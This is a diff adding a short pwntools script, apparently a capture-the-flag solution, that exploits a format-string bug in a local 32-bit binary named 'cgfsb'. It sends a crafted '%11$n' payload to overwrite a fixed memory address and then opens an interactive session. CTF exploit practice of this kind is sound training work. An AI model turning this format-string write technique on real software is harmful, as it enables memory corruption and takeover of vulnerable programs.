@@ -1,0 +1,22 @@
+# coding:UTF-8
+# author:iopr
+
+from pwn import *
+context(os='linux',arch='i386')
+
+Debug=1
+if Debug:
+    io=process('./cgfsb')
+else:
+    pass
+
+buf=0xBF860218
+
+def main():
+    io.recv()
+    io.sendline("")
+    io.recv()
+    io.sendline('aaaa'+p32(0x0804A068)+"%11$n")
+    io.interactive()
+
+main()
